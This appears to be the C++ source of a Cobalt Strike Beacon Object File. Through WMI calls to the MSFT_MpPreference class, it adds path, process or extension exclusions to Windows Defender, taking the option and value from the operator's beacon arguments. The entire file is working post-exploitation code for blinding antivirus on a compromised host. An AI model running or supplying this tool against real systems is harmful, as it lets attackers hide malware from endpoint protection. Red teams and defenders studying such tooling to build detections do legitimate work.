#include <windows.h>
#include <wbemidl.h>
#include <comdef.h>
#include "headers/beacon.h"
#include "headers/win32.h"
#pragma comment(lib, "wbemuuid.lib")

#define FOLDER_EXCLUSIONS       L"ExclusionPath"
#define PROCESS_EXCLUSIONS      L"ExclusionProcess"
#define EXTENSION_EXCLUSIONS    L"ExclusionExtension"



INT AddDefenderExclusions(int option, wchar_t* value)
{

    const wchar_t* options[] = { FOLDER_EXCLUSIONS, PROCESS_EXCLUSIONS, EXTENSION_EXCLUSIONS };

    HRESULT hr;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Get args: %d %ws", option, value);
    if(option>3)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] no option found: %d", option);
        return 0;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] CoInitialize...");
    hr = OLE32$CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoInitializeEx has failed: %08x", hr);
        return 0;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] CoInitializeSecurity...");
    hr = OLE32$CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL
    );
    if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoInitializeSecurity has failed: %08x\n", hr);
        OLE32$CoUninitialize();
        return 0;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] CoCreateInstance CLSID_WbemLocator...");
    IWbemLocator* pLoc = 0;
    hr = OLE32$CoCreateInstance(g_CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, g_IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoCreateInstance has failed: %08x", hr);
        OLE32$CoUninitialize();
        return 0;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ConnectServer...");
    IWbemServices* pSvc = 0;
    hr = pLoc->ConnectServer(L"ROOT\\Microsoft\\Windows\\Defender", NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] ConnectServer has failed: %08x", hr);
        pLoc->Release();
        OLE32$CoUninitialize();
        return 0;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] CoSetProxyBlanket...");
    hr = OLE32$CoSetProxyBlanket(
        pSvc,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        NULL,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE
    );
    if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoSetProxyBlanket has failed: %08x", hr);
        pSvc->Release();
        pLoc->Release();
        OLE32$CoUninitialize();
        return 0;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] GetObject...");
    IWbemClassObject* pClass = 0;
    BSTR Clname = L"MSFT_MpPreference";
    hr = pSvc->GetObject(Clname, 0, NULL, &pClass, NULL);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] GetMethod...");
    BSTR MethodName = L"Add";
    IWbemClassObject* pInSignature = 0;
    hr = pClass->GetMethod(MethodName, 0, &pInSignature, NULL);
    if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetMethod has failed: %08x", hr);
        pInSignature->Release();
        pClass->Release();
        pSvc->Release();
        pLoc->Release();
        OLE32$CoUninitialize();
        return 0;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] SpawnInstance...");
    IWbemClassObject* pClassInstance = NULL;
    hr = pInSignature->SpawnInstance(0, &pClassInstance);
    if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "SpawnInstance has failed: %08x", hr);
        pClassInstance->Release();
        pInSignature->Release();
        pClass->Release();
        pSvc->Release();
        pLoc->Release();
        OLE32$CoUninitialize();
        return 0;
    }

    // Create an array
    SAFEARRAYBOUND rgsaBounds[1];
    rgsaBounds[0].cElements = 1;
    rgsaBounds[0].lLbound = 0;
    SAFEARRAY* psaStrings;
    psaStrings = OLEAUT32$SafeArrayCreate(VT_BSTR, 1, rgsaBounds);

    // Add a string to the array
    VARIANT vString;
    OLEAUT32$VariantInit(&vString);
    V_VT(&vString) = VT_BSTR;
    V_BSTR(&vString) = OLEAUT32$SysAllocString(value);
    LONG lArrayIndex = 0;
    OLEAUT32$SafeArrayPutElement(psaStrings, &lArrayIndex, V_BSTR(&vString));
    OLEAUT32$VariantClear(&vString);
    // variant array
    VARIANT vStringList;
    OLEAUT32$VariantInit(&vStringList);
    V_VT(&vStringList) = VT_ARRAY | VT_BSTR;
    V_ARRAY(&vStringList) = psaStrings;

    //BeaconPrintf(CALLBACK_OUTPUT, "[+] Put Exclusion...");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Put %ws...",options[option-1]);

    hr = pClassInstance->Put(options[option-1], 0, &vStringList, CIM_STRING | CIM_FLAG_ARRAY);
    if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Put has failed: %08x", hr);
        OLEAUT32$VariantClear(&vStringList);
        pClassInstance->Release();
        pInSignature->Release();
        pClass->Release();
        pSvc->Release();
        pLoc->Release();
        OLE32$CoUninitialize();
        return 0;
    }

    IWbemClassObject* pOutParams = NULL;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] ExecMethod...");
    hr = pSvc->ExecMethod(Clname, MethodName, 0, NULL, pClassInstance, NULL, NULL);
    if (FAILED(hr))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] ExecMethod has failed: %08x", hr);
        OLEAUT32$VariantClear(&vStringList);
        pClassInstance->Release();
        pInSignature->Release();
        pClass->Release();
        pSvc->Release();
        pLoc->Release();
        OLE32$CoUninitialize();
        return 0;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Success!");

    OLEAUT32$VariantClear(&vStringList);
    pClassInstance->Release();
    pInSignature->Release();
    pClass->Release();
    pLoc->Release();
    pSvc->Release();
    OLE32$CoUninitialize();

    return 1;
}

extern "C" void go(char* buff, int len)
{
    datap   dpParser;
    wchar_t* value;

    BeaconDataParse(&dpParser, buff, len);

    int iEnumerationOption = BeaconDataInt(&dpParser);
    value = (wchar_t*)BeaconDataExtract(&dpParser, NULL);
    int res = AddDefenderExclusions(iEnumerationOption,value);
    if (!res)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] AddDefenderExclussion has failed");
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] AddDefenderExclussion has Success!");
    }


    return;
}